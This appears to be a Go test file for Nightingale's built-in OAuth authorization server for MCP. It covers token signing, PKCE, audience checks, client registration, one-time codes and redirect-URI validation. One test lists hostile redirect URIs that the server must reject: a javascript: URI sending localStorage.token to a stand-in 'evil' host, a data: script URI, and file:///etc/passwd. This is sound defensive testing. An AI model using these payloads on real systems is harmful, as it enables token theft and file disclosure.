package router

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/ccfos/nightingale/v6/models"
	"github.com/ccfos/nightingale/v6/pkg/aop"
	"github.com/ccfos/nightingale/v6/pkg/httpx"

	"github.com/alicebob/miniredis/v2"
	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt"
	"github.com/redis/go-redis/v9"
)

// newMCPRouter builds a Router with the built-in AS enabled and a miniredis
// backing the one-time-code guard. SigningKey is explicit so token assertions
// are deterministic.
func newMCPRouter(t *testing.T) *Router {
	t.Helper()
	mr, err := miniredis.Run()
	if err != nil {
		t.Fatalf("miniredis: %v", err)
	}
	t.Cleanup(mr.Close)
	rt := &Router{Redis: redis.NewClient(&redis.Options{Addr: mr.Addr()})}
	rt.HTTP.JWTAuth = httpx.JWTAuth{SigningKey: "session-signing-key"}
	rt.HTTP.MCPAuth = httpx.MCPAuth{
		Enable:     true,
		Issuer:     "https://n9e.example.com",
		Resource:   "https://n9e.example.com/mcp",
		SigningKey: "mcp-test-signing-key",
	}
	return rt
}

// mcpEngine registers the public AS routes for httptest.
func mcpEngine(rt *Router) *gin.Engine {
	gin.SetMode(gin.TestMode)
	r := gin.New()
	r.GET(mcpASMetaPath, rt.MCPOAuthServerMetadata)
	r.POST(mcpRegisterPath, rt.MCPOAuthRegister)
	r.GET(mcpAuthorizePath, rt.MCPOAuthAuthorize)
	r.POST(mcpTokenPath, rt.MCPOAuthToken)
	return r
}

func pkceChallenge(verifier string) string {
	sum := sha256.Sum256([]byte(verifier))
	return base64.RawURLEncoding.EncodeToString(sum[:])
}

func TestMCPSignParseRoundTrip(t *testing.T) {
	rt := newMCPRouter(t)
	tok, err := rt.mcpSign(jwt.MapClaims{"token_use": mcpUseAccess, "sub": "42", "usr": "bob"})
	if err != nil {
		t.Fatalf("sign: %v", err)
	}
	claims, err := rt.mcpParse(tok, mcpUseAccess)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if mcpClaimString(claims, "sub") != "42" || mcpClaimString(claims, "usr") != "bob" {
		t.Fatalf("claims roundtrip mismatch: %v", claims)
	}
	// token_use mismatch must be rejected.
	if _, err := rt.mcpParse(tok, mcpUseRefresh); err == nil {
		t.Fatal("expected token_use mismatch to fail")
	}
}

func TestMCPKeyIsolation(t *testing.T) {
	// Derived-key router: MCPAuth.SigningKey empty so the key is HKDF'd from the
	// session key — it must be deterministic AND independent from that key.
	rt := &Router{}
	rt.HTTP.JWTAuth = httpx.JWTAuth{SigningKey: "the-session-key"}
	rt.HTTP.MCPAuth = httpx.MCPAuth{Enable: true}

	k1, k2 := rt.mcpSigningKey(), rt.mcpSigningKey()
	if !bytes.Equal(k1, k2) {
		t.Fatal("derived key is not deterministic")
	}
	if string(k1) == "the-session-key" {
		t.Fatal("derived key must not equal the session signing key")
	}

	// A token signed with the raw session key must NOT verify as an MCP token —
	// this is what prevents a session JWT being accepted as an MCP access token.
	sessionTok, err := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"token_use": mcpUseAccess, "sub": "1", "usr": "x",
		"exp": time.Now().Add(time.Hour).Unix(),
	}).SignedString([]byte("the-session-key"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := rt.mcpParse(sessionTok, mcpUseAccess); err == nil {
		t.Fatal("session-key-signed token must fail MCP verification")
	}
}

func TestMCPVerifyPKCE(t *testing.T) {
	verifier := "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
	if !mcpVerifyPKCE(verifier, pkceChallenge(verifier)) {
		t.Fatal("valid PKCE pair rejected")
	}
	if mcpVerifyPKCE(verifier, pkceChallenge("other")) {
		t.Fatal("mismatched PKCE accepted")
	}
	if mcpVerifyPKCE("", "x") || mcpVerifyPKCE("x", "") {
		t.Fatal("empty PKCE accepted")
	}
}

func TestMCPVerifyAccessToken(t *testing.T) {
	rt := newMCPRouter(t)
	good, _ := rt.mcpSign(jwt.MapClaims{
		"token_use": mcpUseAccess, "sub": "7", "usr": "alice",
		"aud": rt.HTTP.MCPAuth.Resource, "exp": time.Now().Add(time.Hour).Unix(),
	})
	uid, usr, ok := rt.mcpVerifyAccessToken(good)
	if !ok || uid != 7 || usr != "alice" {
		t.Fatalf("verify good token = (%d,%q,%v)", uid, usr, ok)
	}
	// wrong audience rejected (passthrough / token-reuse guard).
	badAud, _ := rt.mcpSign(jwt.MapClaims{
		"token_use": mcpUseAccess, "sub": "7", "usr": "alice",
		"aud": "https://evil.example/mcp", "exp": time.Now().Add(time.Hour).Unix(),
	})
	if _, _, ok := rt.mcpVerifyAccessToken(badAud); ok {
		t.Fatal("token with wrong aud accepted")
	}
	// a refresh token must not pass as an access token.
	refresh, _ := rt.mcpSign(jwt.MapClaims{
		"token_use": mcpUseRefresh, "sub": "7", "usr": "alice",
		"aud": rt.HTTP.MCPAuth.Resource, "exp": time.Now().Add(time.Hour).Unix(),
	})
	if _, _, ok := rt.mcpVerifyAccessToken(refresh); ok {
		t.Fatal("refresh token accepted as access token")
	}
}

func TestMCPMetadataEndpoint(t *testing.T) {
	rt := newMCPRouter(t)
	w := httptest.NewRecorder()
	mcpEngine(rt).ServeHTTP(w, httptest.NewRequest("GET", "http://example.com"+mcpASMetaPath, nil))
	if w.Code != http.StatusOK {
		t.Fatalf("metadata status = %d", w.Code)
	}
	var md map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &md); err != nil {
		t.Fatal(err)
	}
	if md["issuer"] != "https://n9e.example.com" {
		t.Fatalf("issuer = %v", md["issuer"])
	}
	if md["authorization_endpoint"] != "https://n9e.example.com/oauth/authorize" {
		t.Fatalf("authorization_endpoint = %v", md["authorization_endpoint"])
	}
	if md["registration_endpoint"] != "https://n9e.example.com/oauth/register" {
		t.Fatalf("registration_endpoint = %v", md["registration_endpoint"])
	}

	// disabled → 404
	rt.HTTP.MCPAuth.Enable = false
	w2 := httptest.NewRecorder()
	mcpEngine(rt).ServeHTTP(w2, httptest.NewRequest("GET", "http://example.com"+mcpASMetaPath, nil))
	if w2.Code != http.StatusNotFound {
		t.Fatalf("disabled metadata status = %d, want 404", w2.Code)
	}
}

func TestMCPRegisterAndAuthorize(t *testing.T) {
	rt := newMCPRouter(t)
	eng := mcpEngine(rt)

	// DCR
	regBody := `{"client_name":"Test Client","redirect_uris":["https://client.example/cb"]}`
	regReq := httptest.NewRequest("POST", "http://example.com"+mcpRegisterPath, strings.NewReader(regBody))
	regReq.Header.Set("Content-Type", "application/json")
	regW := httptest.NewRecorder()
	eng.ServeHTTP(regW, regReq)
	if regW.Code != http.StatusCreated {
		t.Fatalf("register status = %d, body=%s", regW.Code, regW.Body.String())
	}
	var reg map[string]any
	json.Unmarshal(regW.Body.Bytes(), &reg)
	clientID, _ := reg["client_id"].(string)
	if clientID == "" {
		t.Fatal("no client_id returned")
	}

	// authorize → 302 to the frontend consent route with a valid req ticket
	verifier := "verifier-0123456789-abcdefghijklmnop"
	q := url.Values{}
	q.Set("client_id", clientID)
	q.Set("redirect_uri", "https://client.example/cb")
	q.Set("response_type", "code")
	q.Set("code_challenge", pkceChallenge(verifier))
	q.Set("code_challenge_method", "S256")
	q.Set("state", "xyz")
	authW := httptest.NewRecorder()
	eng.ServeHTTP(authW, httptest.NewRequest("GET", "http://example.com"+mcpAuthorizePath+"?"+q.Encode(), nil))
	if authW.Code != http.StatusFound {
		t.Fatalf("authorize status = %d, body=%s", authW.Code, authW.Body.String())
	}
	loc := authW.Header().Get("Location")
	const wantPrefix = "http://example.com" + mcpConsentPath + "?req="
	if !strings.HasPrefix(loc, wantPrefix) {
		t.Fatalf("authorize Location = %q, want prefix %q", loc, wantPrefix)
	}
	ticket, _ := url.QueryUnescape(strings.TrimPrefix(loc, wantPrefix))
	claims, err := rt.mcpParse(ticket, mcpUseAuthzReq)
	if err != nil {
		t.Fatalf("consent ticket invalid: %v", err)
	}
	if mcpClaimString(claims, "redirect_uri") != "https://client.example/cb" ||
		mcpClaimString(claims, "client_id") != clientID {
		t.Fatalf("ticket claims mismatch: %v", claims)
	}

	// authorize with a redirect_uri not registered must be refused (open-redirect guard).
	q.Set("redirect_uri", "https://attacker.example/cb")
	badW := httptest.NewRecorder()
	eng.ServeHTTP(badW, httptest.NewRequest("GET", "http://example.com"+mcpAuthorizePath+"?"+q.Encode(), nil))
	if badW.Code != http.StatusBadRequest {
		t.Fatalf("authorize with bad redirect_uri status = %d, want 400", badW.Code)
	}
}

// DCR must reject non-http(s) redirect_uri schemes (javascript:/data: would
// execute in n9e's origin once the SPA navigates to it).
func TestMCPRegisterRejectsDangerousScheme(t *testing.T) {
	rt := newMCPRouter(t)
	eng := mcpEngine(rt)

	for _, ru := range []string{
		"javascript:fetch('//evil/'+localStorage.token)",
		"data:text/html,<script>1</script>",
		"file:///etc/passwd",
	} {
		body, _ := json.Marshal(map[string]any{"client_name": "x", "redirect_uris": []string{ru}})
		req := httptest.NewRequest("POST", "http://example.com"+mcpRegisterPath, bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		eng.ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Fatalf("register %q status = %d, want 400", ru, w.Code)
		}
	}
}

func TestMCPTokenOneTimeCode(t *testing.T) {
	rt := newMCPRouter(t)
	eng := mcpEngine(rt)

	verifier := "verifier-0123456789-abcdefghijklmnop"
	code, _ := rt.mcpSign(jwt.MapClaims{
		"token_use":      mcpUseCode,
		"sub":            "7",
		"usr":            "alice",
		"client_id":      "cid",
		"redirect_uri":   "https://client.example/cb",
		"code_challenge": pkceChallenge(verifier),
		"resource":       rt.HTTP.MCPAuth.Resource,
		"jti":            "jti-unit-1",
		"exp":            time.Now().Add(time.Minute).Unix(),
	})

	exchange := func() *httptest.ResponseRecorder {
		form := url.Values{}
		form.Set("grant_type", "authorization_code")
		form.Set("code", code)
		form.Set("code_verifier", verifier)
		form.Set("redirect_uri", "https://client.example/cb")
		form.Set("client_id", "cid")
		req := httptest.NewRequest("POST", "http://example.com"+mcpTokenPath, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		w := httptest.NewRecorder()
		eng.ServeHTTP(w, req)
		return w
	}

	// first exchange succeeds and yields a usable access token
	w := exchange()
	if w.Code != http.StatusOK {
		t.Fatalf("first exchange status = %d, body=%s", w.Code, w.Body.String())
	}
	var tok map[string]any
	json.Unmarshal(w.Body.Bytes(), &tok)
	access, _ := tok["access_token"].(string)
	uid, usr, ok := rt.mcpVerifyAccessToken(access)
	if !ok || uid != 7 || usr != "alice" {
		t.Fatalf("issued access token invalid: (%d,%q,%v)", uid, usr, ok)
	}

	// replay of the same code is rejected (one-time guard via Redis SetNX)
	w2 := exchange()
	if w2.Code != http.StatusBadRequest {
		t.Fatalf("code replay status = %d, want 400; body=%s", w2.Code, w2.Body.String())
	}
	var errResp map[string]any
	json.Unmarshal(w2.Body.Bytes(), &errResp)
	if errResp["error"] != "invalid_grant" {
		t.Fatalf("replay error = %v, want invalid_grant", errResp["error"])
	}

	// bad PKCE verifier is rejected (use a fresh code so the one-time guard isn't the cause)
	code2, _ := rt.mcpSign(jwt.MapClaims{
		"token_use": mcpUseCode, "sub": "7", "usr": "alice", "client_id": "cid",
		"redirect_uri": "https://client.example/cb", "code_challenge": pkceChallenge(verifier),
		"resource": rt.HTTP.MCPAuth.Resource, "jti": "jti-unit-2",
		"exp": time.Now().Add(time.Minute).Unix(),
	})
	form := url.Values{}
	form.Set("grant_type", "authorization_code")
	form.Set("code", code2)
	form.Set("code_verifier", "wrong-verifier")
	form.Set("redirect_uri", "https://client.example/cb")
	req := httptest.NewRequest("POST", "http://example.com"+mcpTokenPath, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	wp := httptest.NewRecorder()
	eng.ServeHTTP(wp, req)
	if wp.Code != http.StatusBadRequest {
		t.Fatalf("bad PKCE status = %d, want 400", wp.Code)
	}
}

func TestMCPDecisionMintsCode(t *testing.T) {
	rt := newMCPRouter(t)
	verifier := "verifier-decision-abcdefghijklmnop"
	ticket, _ := rt.mcpSign(jwt.MapClaims{
		"token_use":      mcpUseAuthzReq,
		"client_id":      "cid",
		"redirect_uri":   "https://client.example/cb",
		"code_challenge": pkceChallenge(verifier),
		"state":          "st",
		"scope":          "mcp",
		"resource":       rt.HTTP.MCPAuth.Resource,
		"exp":            time.Now().Add(time.Minute).Unix(),
	})

	// Stub the auth()+user() middleware by injecting the session user.
	gin.SetMode(gin.TestMode)
	eng := gin.New()
	eng.POST("/decision", func(c *gin.Context) {
		c.Set("user", &models.User{Id: 7, Username: "alice"})
		c.Next()
	}, rt.MCPOAuthDecision)

	body, _ := json.Marshal(map[string]string{"req": ticket, "decision": "allow"})
	req := httptest.NewRequest("POST", "http://example.com/decision", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	eng.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("decision status = %d, body=%s", w.Code, w.Body.String())
	}
	// The redirect carries the minted code; pull it out and verify it is a
	// mcp_code bound to the session user.
	var env map[string]any
	json.Unmarshal(w.Body.Bytes(), &env)
	redirect := findRedirect(env)
	if redirect == "" {
		t.Fatalf("no redirect in response: %s", w.Body.String())
	}
	u, err := url.Parse(redirect)
	if err != nil {
		t.Fatalf("redirect parse: %v", err)
	}
	codeClaims, err := rt.mcpParse(u.Query().Get("code"), mcpUseCode)
	if err != nil {
		t.Fatalf("minted code invalid: %v", err)
	}
	if mcpClaimString(codeClaims, "sub") != "7" || mcpClaimString(codeClaims, "usr") != "alice" {
		t.Fatalf("code not bound to session user: %v", codeClaims)
	}
}

// findRedirect digs the "redirect" value out of whatever envelope ginx renders.
func findRedirect(v any) string {
	switch t := v.(type) {
	case map[string]any:
		if r, ok := t["redirect"].(string); ok {
			return r
		}
		for _, sub := range t {
			if r := findRedirect(sub); r != "" {
				return r
			}
		}
	}
	return ""
}

// TestAgentOAuthScopeConfinesOAuthToken pins the confinement: a builtin-AS
// access token authenticates on an agent surface (where agentOAuthScope marks
// the request) but is refused on an ordinary tokenAuth-protected API route (no
// marker), so an MCP/RS token cannot be replayed against the rest of /api/n9e/*.
func TestAgentOAuthScopeConfinesOAuthToken(t *testing.T) {
	rt := newMCPRouter(t)
	access, err := rt.mcpSign(jwt.MapClaims{
		"token_use": mcpUseAccess, "sub": "7", "usr": "alice",
		"aud": rt.HTTP.MCPAuth.Resource, "exp": time.Now().Add(time.Hour).Unix(),
	})
	if err != nil {
		t.Fatalf("sign access token: %v", err)
	}

	gin.SetMode(gin.TestMode)
	r := gin.New()
	r.Use(aop.Recovery())
	// Agent surface: marker installed before tokenAuth → OAuth token accepted.
	r.GET("/a2a/ping", rt.agentOAuthScope(), rt.tokenAuth(), func(c *gin.Context) {
		c.String(http.StatusOK, c.GetString("username"))
	})
	// Ordinary API: no marker → OAuth token falls through to the session-JWT
	// path and is rejected.
	r.GET("/api/n9e/secret", rt.tokenAuth(), func(c *gin.Context) {
		c.String(http.StatusOK, "ok")
	})

	do := func(path string) *httptest.ResponseRecorder {
		w := httptest.NewRecorder()
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.Header.Set("Authorization", "Bearer "+access)
		r.ServeHTTP(w, req)
		return w
	}

	if w := do("/a2a/ping"); w.Code != http.StatusOK || w.Body.String() != "alice" {
		t.Fatalf("agent endpoint: code=%d body=%q, want 200/alice", w.Code, w.Body.String())
	}
	if w := do("/api/n9e/secret"); w.Code != http.StatusUnauthorized {
		t.Fatalf("non-agent endpoint: code=%d, want 401 (token confined to agent surface)", w.Code)
	}
}

func TestMCPRedirectAllowed(t *testing.T) {
	client := jwt.MapClaims{"redirect_uris": []interface{}{"https://a.example/cb", "https://b.example/cb"}}
	if !mcpRedirectAllowed(client, "https://b.example/cb") {
		t.Fatal("registered redirect_uri rejected")
	}
	if mcpRedirectAllowed(client, "https://b.example/cb?x=1") {
		t.Fatal("non-exact redirect_uri accepted")
	}
	if mcpRedirectAllowed(client, "") {
		t.Fatal("empty redirect_uri accepted")
	}
}
